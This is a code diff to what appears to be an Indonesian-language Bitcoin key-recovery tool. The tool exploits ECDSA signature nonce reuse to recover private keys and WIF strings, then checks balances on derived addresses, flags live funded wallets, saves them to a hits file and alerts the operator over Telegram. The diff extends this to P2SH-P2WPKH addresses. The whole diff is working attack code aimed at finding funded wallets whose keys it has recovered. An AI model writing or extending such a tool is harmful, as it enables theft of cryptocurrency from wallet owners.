@@ -425,6 +425,12 @@ function p2wpkhAddress(hash160Bytes, hrp = "bc") {
   const data = [0].concat(convertBits(Array.from(hash160Bytes), 8, 5, true));
   return bech32Encode(hrp, data);
 }
+function p2shP2wpkhAddress(hash160Bytes, prefix = 0x05) {
+  // redeemScript = 0x00 0x14 <20-byte hash160(pubkey-compressed)>
+  // address = base58(prefix || hash160(redeemScript) || checksum)
+  const redeem = concat(new Uint8Array([0x00, 0x14]), hash160Bytes);
+  return p2pkhAddress(hash160(redeem), prefix);
+}
 
 // ============================================================
 // Recovery private key dari R-reuse
@@ -716,6 +722,7 @@ async function detectReuse(sigs, opts = {}) {
               const addrCompressed = p2pkhAddress(h160C);
               const addrUncompressed = p2pkhAddress(hash160(pubUncompressed));
               const addrSegwit = p2wpkhAddress(h160C); // bc1q... (P2WPKH)
+              const addrP2sh = p2shP2wpkhAddress(h160C); // 3...   (P2SH-P2WPKH)
               const wifC = toWIF(d, 0x80, true);
               const wifU = toWIF(d, 0x80, false);
               console.log();
@@ -728,6 +735,7 @@ async function detectReuse(sigs, opts = {}) {
                 c(C.dim, "Addr P2PKH c  ") + " " + c(C.green + C.bold, addrCompressed),
                 c(C.dim, "Addr P2PKH u  ") + " " + c(C.green + C.bold, addrUncompressed),
                 c(C.dim, "Addr P2WPKH   ") + " " + c(C.green + C.bold, addrSegwit),
+                c(C.dim, "Addr P2SH-WPKH") + " " + c(C.green + C.bold, addrP2sh),
               ], C.green);
 
               recovered.push({
@@ -740,6 +748,7 @@ async function detectReuse(sigs, opts = {}) {
                 addressCompressed: addrCompressed,
                 addressUncompressed: addrUncompressed,
                 addressSegwit: addrSegwit,
+                addressP2sh: addrP2sh,
                 r: padHex(a.r),
                 txids: [a.txid, b.txid].filter(Boolean),
                 inputs: [a.index, b.index],
@@ -758,7 +767,7 @@ async function detectReuse(sigs, opts = {}) {
   if (recovered.length && opts.checkBalance !== false) {
     const base = opts.api || DEFAULT_API;
     console.log();
-    sep("Pengecekan Saldo (" + (recovered.length * 3) + " address di " + base + ")");
+    sep("Pengecekan Saldo (" + (recovered.length * 4) + " address di " + base + ")");
     const fmtBalance = (b, label) => {
       if (b.balanceSat == null) return c(C.red, ICON.err + " error " + label);
       const live = b.balanceSat > 0;
@@ -768,18 +777,21 @@ async function detectReuse(sigs, opts = {}) {
       return head + c(C.gray, "   " + label + " · diterima " + formatBTC(b.totalReceivedSat) + " · " + b.txCount + " tx");
     };
     for (const h of recovered) {
-      const [bC, bU, bS] = await Promise.all([
+      const [bC, bU, bS, bP] = await Promise.all([
         fetchAddressBalance(base, h.addressCompressed),
         fetchAddressBalance(base, h.addressUncompressed),
         fetchAddressBalance(base, h.addressSegwit),
+        fetchAddressBalance(base, h.addressP2sh),
       ]);
       h.balanceCompressed = bC;
       h.balanceUncompressed = bU;
       h.balanceSegwit = bS;
+      h.balanceP2sh = bP;
       const live =
         (bC.balanceSat && bC.balanceSat > 0) ||
         (bU.balanceSat && bU.balanceSat > 0) ||
-        (bS.balanceSat && bS.balanceSat > 0);
+        (bS.balanceSat && bS.balanceSat > 0) ||
+        (bP.balanceSat && bP.balanceSat > 0);
       const tag = live ? "  " + ICON.alert + c(C.red + C.bold, " WALLET HIDUP") : "";
       console.log(c(live ? C.green + C.bold : C.dim, "\n  " + h.addressCompressed) + tag);
       console.log("    " + fmtBalance(bC, "P2PKH compressed"));
@@ -787,6 +799,8 @@ async function detectReuse(sigs, opts = {}) {
       console.log("    " + fmtBalance(bU, "P2PKH uncompressed"));
       console.log(c(live ? C.green + C.bold : C.dim, "  " + h.addressSegwit));
       console.log("    " + fmtBalance(bS, "P2WPKH (bech32)"));
+      console.log(c(live ? C.green + C.bold : C.dim, "  " + h.addressP2sh));
+      console.log("    " + fmtBalance(bP, "P2SH-P2WPKH (3...)"));
     }
 
     // Notifikasi Telegram (jika diaktifkan di config.json)
@@ -796,13 +810,15 @@ async function detectReuse(sigs, opts = {}) {
         ? recovered.filter((h) =>
             (h.balanceCompressed && h.balanceCompressed.balanceSat > 0) ||
             (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0) ||
-            (h.balanceSegwit && h.balanceSegwit.balanceSat > 0))
+            (h.balanceSegwit && h.balanceSegwit.balanceSat > 0) ||
+            (h.balanceP2sh && h.balanceP2sh.balanceSat > 0))
         : recovered;
       for (const h of targets) {
         const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
         const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
         const liveS = h.balanceSegwit && h.balanceSegwit.balanceSat > 0;
-        const tag = (liveC || liveU || liveS) ? "🚨 *WALLET HIDUP DITEMUKAN*" : "🔑 *Private key dipulihkan*";
+        const liveP = h.balanceP2sh && h.balanceP2sh.balanceSat > 0;
+        const tag = (liveC || liveU || liveS || liveP) ? "🚨 *WALLET HIDUP DITEMUKAN*" : "🔑 *Private key dipulihkan*";
         const lines = [
           tag,
           h.scannedAddress ? "Scan: `" + h.scannedAddress + "`" : null,
@@ -814,6 +830,8 @@ async function detectReuse(sigs, opts = {}) {
             (liveU ? " — *" + formatBTC(h.balanceUncompressed.balanceSat) + "*" : ""),
           "P2WPKH bc1 : `" + h.addressSegwit + "`" +
             (liveS ? " — *" + formatBTC(h.balanceSegwit.balanceSat) + "*" : ""),
+          "P2SH-P2WPKH: `" + h.addressP2sh + "`" +
+            (liveP ? " — *" + formatBTC(h.balanceP2sh.balanceSat) + "*" : ""),
           "TXID: " + (h.txids || []).slice(0, 4).map((t) => "`" + t.slice(0, 16) + "…`").join(", "),
         ].filter(Boolean);
         await notifyTelegram(lines.join("\n"));
@@ -828,7 +846,8 @@ async function detectReuse(sigs, opts = {}) {
         const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
         const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
         const liveS = h.balanceSegwit && h.balanceSegwit.balanceSat > 0;
-        const banner = (liveC || liveU || liveS) ? "  *** WALLET MASIH ADA SALDO ***" : "";
+        const liveP = h.balanceP2sh && h.balanceP2sh.balanceSat > 0;
+        const banner = (liveC || liveU || liveS || liveP) ? "  *** WALLET MASIH ADA SALDO ***" : "";
         lines.push("==========================================================" + banner);
         lines.push("Waktu              : " + h.ts);
         if (h.scannedAddress) lines.push("Address yang di-scan: " + h.scannedAddress);
@@ -854,6 +873,12 @@ async function detectReuse(sigs, opts = {}) {
           lines.push("  Total diterima   : " + formatBTC(h.balanceSegwit.totalReceivedSat));
           lines.push("  Jumlah tx        : " + h.balanceSegwit.txCount);
         }
+        lines.push("Address P2SH-WPKH  : " + h.addressP2sh);
+        if (h.balanceP2sh) {
+          lines.push("  Saldo            : " + formatBTC(h.balanceP2sh.balanceSat));
+          lines.push("  Total diterima   : " + formatBTC(h.balanceP2sh.totalReceivedSat));
+          lines.push("  Jumlah tx        : " + h.balanceP2sh.txCount);
+        }
         lines.push("R reuse value      : " + h.r);
         lines.push("TXID terkait       : " + h.txids.join(", "));
         lines.push("");
@@ -867,7 +892,8 @@ async function detectReuse(sigs, opts = {}) {
       const live = recovered.filter((h) =>
         (h.balanceCompressed && h.balanceCompressed.balanceSat > 0) ||
         (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0) ||
-        (h.balanceSegwit && h.balanceSegwit.balanceSat > 0));
+        (h.balanceSegwit && h.balanceSegwit.balanceSat > 0) ||
+        (h.balanceP2sh && h.balanceP2sh.balanceSat > 0));
       if (live.length) {
         const liveFile = hitsFile.replace(/\.txt$/, "") + "_LIVE.txt";
         const liveLines = [];
@@ -896,6 +922,12 @@ async function detectReuse(sigs, opts = {}) {
             liveLines.push("  Saldo            : " + formatBTC(h.balanceSegwit.balanceSat));
             liveLines.push("  Total diterima   : " + formatBTC(h.balanceSegwit.totalReceivedSat));
             liveLines.push("  Jumlah tx        : " + h.balanceSegwit.txCount);
+          }
+          liveLines.push("Address P2SH-WPKH  : " + h.addressP2sh);
+          if (h.balanceP2sh) {
+            liveLines.push("  Saldo            : " + formatBTC(h.balanceP2sh.balanceSat));
+            liveLines.push("  Total diterima   : " + formatBTC(h.balanceP2sh.totalReceivedSat));
+            liveLines.push("  Jumlah tx        : " + h.balanceP2sh.txCount);
           }
           liveLines.push("R reuse value      : " + h.r);
           liveLines.push("TXID terkait       : " + h.txids.join(", "));
